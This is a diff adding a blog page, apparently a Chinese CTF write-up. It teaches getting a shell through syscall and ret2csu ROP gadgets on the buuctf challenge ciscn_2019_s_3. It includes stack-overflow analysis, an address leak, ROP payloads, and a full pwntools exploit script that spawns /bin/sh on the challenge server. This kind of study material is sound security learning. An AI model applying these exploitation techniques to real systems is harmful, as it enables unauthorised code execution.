@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="xia0ji233" />
+
+
+
+<meta name="description" content="today新的知识又增长了，发现了getshell的另一种方式：syscall和srop。故事还要源于…(此处省略万字输出)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="系统调用">
+<meta property="og:url" content="http://example.com/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="xia0ji233&#39;s Blog">
+<meta property="og:description" content="today新的知识又增长了，发现了getshell的另一种方式：syscall和srop。故事还要源于…(此处省略万字输出)">
+<meta property="og:locale">
+<meta property="og:image" content="https://i.loli.net/2021/05/25/dSTQLa938pI7yWF.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/25/9jhLFiKV2cxZ3EA.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/25/SBZextFr7cIw3J8.png">
+<meta property="article:published_time" content="2021-05-22T02:00:00.000Z">
+<meta property="article:modified_time" content="2021-10-25T04:42:29.725Z">
+<meta property="article:author" content="xia0ji233">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/05/25/dSTQLa938pI7yWF.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="xia0ji233&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>系统调用 | xia0ji233&#39;s Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">文章</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" href="/2636876456" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">文章</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="/2636876456" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-系统调用学习" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/" class="article-date">
+      <time datetime="2021-05-22T02:00:00.000Z" itemprop="datePublished">2021-05-22</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      系统调用
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/ctf/">ctf</a><a class="article-category-link" href="/categories/ctf/re/">re</a>
+    </div>
+
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p><code>today</code>新的知识又增长了，发现了<code>getshell</code>的另一种方式：<code>syscall</code>和<code>srop</code>。故事还要源于…(此处省略万字输出)</p>
+<span id="more"></span>
+
+<p>(note:本作者这次有点懒，没有写AT&amp;T汇编，而是一律用了intel汇编，请悉知)</p>
+<p>可能是之前汇编基础不太好吧，竟没有发现<code>syscall</code>这么好用的指令，只要再把<code>/bin/sh</code>传参就能直接打开一个shell，真是妙蛙。但是在系统调用之前要做很多的事情，诸如各类参数传递，以64位的来说，我们要先知道我们要执行的函数系统调用号为59。我也是翻过<code>libc</code>库的，发现<code>system</code>函数实现里面有一段竟然是直接执行<code>execve(&quot;/bin/sh&quot;)</code></p>
+<p><img src="https://i.loli.net/2021/05/25/dSTQLa938pI7yWF.png" alt="syscall_1.png"></p>
+<p>实属意外了，这是在我有次反汇编<code>libc</code>库的时候发现的，我原来一直是只用<code>system</code>函数<code>getshell</code>的，没想到<code>system</code>内部是通过这样的系统调用来打开<code>shell</code>的。</p>
+<p>那这得学啊，这是基础的基础啊。</p>
+<p>这边给出一下64位Linux的各个系统调用号，这个在Linux的<code>/usr/include/asm/unistd.h </code>下有，我这里截取部分。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _ASM_X86_UNISTD_64_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ASM_X86_UNISTD_64_H 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_read 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_write 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_open 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_close 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_stat 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstat 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lstat 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_poll 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lseek 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mmap 9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mprotect 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munmap 11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_brk 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigaction 13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigprocmask 14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigreturn 15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioctl 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pread64 17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pwrite64 18</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readv 19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_writev 20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_access 21</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pipe 22</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_select 23</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_yield 24</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mremap 25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_msync 26</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mincore 27</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_madvise 28</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmget 29</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmat 30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmctl 31</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup2 33</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pause 34</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_nanosleep 35</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getitimer 36</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_alarm 37</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setitimer 38</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpid 39</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendfile 40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_socket 41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_connect 42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_accept 43</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendto 44</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_recvfrom 45</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendmsg 46</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_recvmsg 47</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shutdown 48</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bind 49</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_listen 50</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsockname 51</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpeername 52</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_socketpair 53</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setsockopt 54</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsockopt 55</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clone 56</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fork 57</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vfork 58</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execve 59</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_exit 60</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_wait4 61</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_kill 62</span></span><br></pre></td></tr></table></figure>
+
+<p>emm，经过多方取证呢，发现打开shell不仅要给第一个参数传上<code>/bin/sh</code>字符串，第二第三个字符串都需要置零。64位呢前六个参数是依次给<code>rdi,rsi,rdx,rcx,r8,r9</code>这六个寄存器的。那么我们传参过程就比较艰难，注入代码首先肯定不现实，现在题目基本都是NX保护的挺到位的。所以要去程序里面寻找<code>gadget</code>，由于<code>pop %rbx</code>这个<code>gadget</code>巨难找，在实际应用要懂得变通，比如先给一个寄存器我想要的值然后再<code>mov</code>给<code>rdx</code>，有一样的效果。</p>
+<p>由此就衍生出来一个<code>return to __libc_csu_init</code>简称<code>ret2csu</code>的方法来，其实这个我个人认为没有必要单独拿出来讲，因为就是因为这个特殊的函数基本蕴含了很多时候我们需要的<code>gadget</code>才会被如此传唱的，会了基本的<code>rop</code>攻击就行，<code>ret2csu</code>的原理跟这个就一模一样。</p>
+<p>一般的payload就是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=fill_data+fake_rbp+(mov rax,<span class="number">59</span>)+pop_rdi+bin_sh_addr+pop_rsi+<span class="number">0</span>+pop_rdx+<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>这是一般的payload，如果找不到对应的gadget，可以自己适当变通。</p>
+<h2 id="buuctf-ciscn-s-3"><a href="#buuctf-ciscn-s-3" class="headerlink" title="buuctf:ciscn_s_3"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_s_3">buuctf:ciscn_s_3</a></h2><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>64位无壳的elf程序，扔进<code>IDA</code>竟发现<code>plt</code>表只有可怜的两项，并且实用性也不大的那种。在一般的<code>ret2libc</code>中我们一般通过一个输出函数<code>(puts,write,printf)</code>来泄露地址，然而这里没有可以利用的输出函数，如果你想模仿下面输出一个<code>plt</code>表项内容也可以，不拦你，只是你费尽心思用系统调用的<code>puts</code>或者<code>write</code>为何不直接用<code>execve</code>直接<code>getshell</code>呢？所以我们就确定我们采用<code>syscall</code>的方式去<code>getshell</code>。</p>
+<h3 id="寻找漏洞"><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h3><p>这一个可以说很明显的一个栈溢出漏洞了，<code>read</code> <code>0x400</code>字节的数据，且缓冲区特别小。</p>
+<h3 id="第一次溢出"><a href="#第一次溢出" class="headerlink" title="第一次溢出"></a>第一次溢出</h3><p>由于程序并未直接提供<code>/bin/sh</code>字符串，因此我们要靠自己，然后最后填上一个<code>main</code>实现二次溢出，第一次写<code>/bin/sh</code>，第二次执行<code>execve(&quot;/bin/sh&quot;)</code>。</p>
+<hr>
+<p>这里提出一点我自己的看法，我认为这个题目有点问题，vlun函数很可能存在栈不平衡的情况，理由有两点</p>
+<p>1.程序正常执行(无溢出)无法正常结束</p>
+<p>2.给<code>24</code>字节大小的数据可以直接覆盖<code>rip</code>，因为我的理解是缓冲区大小<code>16</code>字节再加上一个<code>rbp 8</code>字节应该<code>24</code>个字节才刚刚覆盖到<code>rbp</code>的位置，而无法覆盖返回地址的。</p>
+<hr>
+<p>而且由于我们要调用栈上的数据，且栈是动态的，我们无法准确得知我们写的<code>/bin/sh</code>字符串的所在位置，因此我们第一次溢出可谓是身负重担，不仅要提供<code>/bin/sh</code>字符串还要泄露栈的地址。由于程序只有下面的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_write(<span class="number">1u</span>, buf, <span class="number">0x30</span>uLL);</span><br></pre></td></tr></table></figure>
+
+<p>因此我们必须通过这个函数泄露点什么。</p>
+<p>想想当时程序调用的栈帧是什么样的，什么内容是跟栈的地址有关的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">低地址↑</span><br><span class="line">buf in vlun</span><br><span class="line"></span><br><span class="line">rbp for main</span><br><span class="line">rip for main</span><br><span class="line">rbp for main&#x27;s father function</span><br><span class="line">rip for main&#x27;s father function</span><br><span class="line">高地址↓</span><br></pre></td></tr></table></figure>
+
+<p>如此我们也可以清楚看到，首先main的rbp是肯定被我们覆盖了的(PS 虽然现在好像是没有的)，然后后面还有一个调用main函数的那个函数的rbp，那个可以确定栈的地址，能输出这个之后我们就可以开始算偏移了。</p>
+<p>gdb调试算算rbp与它们之间的偏移，这里需要注意由于栈不平衡的原因，我们需要手动调一下rip让程序不要异常退出，然后我们调试到leave指令可以观察到此时的栈。</p>
+<p><img src="https://i.loli.net/2021/05/25/9jhLFiKV2cxZ3EA.png" alt="syscall_2.png"></p>
+<p>在地址0x7fffffffde20的地方存了__libc_start_main函数的rbp=0x7fffffffdf28，那么计算一下偏移就是264，当前的rsp是main函数的rsp是vlun函数的rbp，所以我们泄露出来的这个地址与vlun函数的rbp偏移了264字节，然后再有16字节的缓冲区，如果我们再缓冲区开始写入<code>/bin/sh</code>字符串的话那么偏移就有280字节的大小。</p>
+<p>然而这些应该是第二次溢出考虑的问题，这里只是分析一下泄露地址的可行性。</p>
+<p>第一次的payload比较简单</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;/bin/sh\0&#x27;</span>*<span class="number">2</span>+p64(main)</span><br></pre></td></tr></table></figure>
+
+<p>然后接受准备接收rbp，但是在改rip的过程中发现这里还是有0x20个字节才能到rbp的，但是我能直接略过rbp覆盖rip就有点离谱，就不知道main的rbp是存在哪了，也许是存在rip后面了。这个我也不太能讲的清楚，希望有师傅明白的话能为我解答一下，感激不尽。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">rbp=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">bin_sh=rbp-<span class="number">280</span><span class="comment">#注意一下栈往低地址增长</span></span><br></pre></td></tr></table></figure>
+
+<p>那么第一次溢出完美的构造了<code>/bin/sh</code>字符串并且获得了它的地址。</p>
+<h3 id="第二次溢出"><a href="#第二次溢出" class="headerlink" title="第二次溢出"></a>第二次溢出</h3><p>第二次溢出要准备的东西就有点多了。</p>
+<h4 id="寻找gadget"><a href="#寻找gadget" class="headerlink" title="寻找gadget"></a>寻找gadget</h4><p>我们需要的gadget有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">pop rdi</span><br><span class="line">pop rsi</span><br><span class="line">pop rdx</span><br></pre></td></tr></table></figure>
+
+<p>经过努力的寻找我们找到了mov rax,59用于代替pop rax，syscall本来就有，pop rdi很好找，pop rsi也有，唯独就是pop rdx找不着，但是关于rbx的gadget可以看到有一个mov rdx,r13，在libc_csu_init函数有一堆的pop寄存器的操作，我们也可以很容易找到pop r13，那么pop r13和mov rdx,r13两个一结合不就是pop rdx嘛，对吧。</p>
+<p>但是需要注意的是，mov rdx,r13后面跟的并不是ret，所以在执行mov rdx,13这个gadget时候，要把rip及时地劫持回来。它运行到后面之后会执行call ptr[r12+rbx*8]，并且，rbx,rbp,r12~r15都是我们可以随意改的。</p>
+<p>rbx我们置零，r12我们放在我们payload上面的其中一个地方能让它接着执行就可以了。</p>
+<p>那么我们先写payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;/bin/sh\0&#x27;</span>*<span class="number">2</span>+p64(pop_rbx_rbp)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(bin_sh+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(mov_rdx)+p64(mov_rax)+p64(pop_rdi)+p64(bin_sh)+p64(syscall)</span><br></pre></td></tr></table></figure>
+
+<p>就是原本传给r12的偏移我用的是+0x48的，结果给报错了，反正这个题挺神奇的，就是感觉少了八字节的数据在里面但是好像又没少，希望有师傅能为我解答一下这个困惑，但是我一般遇到这种情况就偏移多8少8都试试看，如果是32位那就上下偏移4看看。</p>
+<p>最后给师傅们看看结果吧</p>
+<p><img src="https://i.loli.net/2021/05/25/SBZextFr7cIw3J8.png" alt="syscall_3.png"></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28330</span>)</span><br><span class="line">main=<span class="number">0x0004004ED</span></span><br><span class="line">mov_rax=<span class="number">0x04004E2</span></span><br><span class="line">pop_rdi=<span class="number">0x4005a3</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15=<span class="number">0x40059A</span></span><br><span class="line">mov_rdxr13_call=<span class="number">0x0400580</span> </span><br><span class="line">syscall=<span class="number">0x00400517</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;/ban/sh\x00&#x27;</span>*<span class="number">2</span>+p64(main)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">rbp=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">bin_sh=rbp-<span class="number">280</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\0/bin/sh\0&#x27;</span>+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(bin_sh+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(mov_rdxr13_call)+p64(mov_rax)+p64(pop_rdi)+p64(bin_sh)+p64(syscall)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/">系统调用</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
+        <p><span>发布时间:</span>2021-05-22, 10:00:00</p>
+        <p><span>最后更新:</span>2021-10-25, 12:42:29</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/" title="系统调用">http://example.com/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://example.com/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2021/05/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/">
+                    动态调试工具的使用
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2021/05/13/ret2libc%E5%AE%9E%E6%88%98/">
+                    ret2libc实战
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#buuctf-ciscn-s-3"><span class="toc-number">1.</span> <span class="toc-text">buuctf:ciscn_s_3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.1.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text">寻找漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%BA%A2%E5%87%BA"><span class="toc-number">1.3.</span> <span class="toc-text">第一次溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E6%BA%A2%E5%87%BA"><span class="toc-number">1.4.</span> <span class="toc-text">第二次溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEgadget"><span class="toc-number">1.4.1.</span> <span class="toc-text">寻找gadget</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.5.</span> <span class="toc-text">exp</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
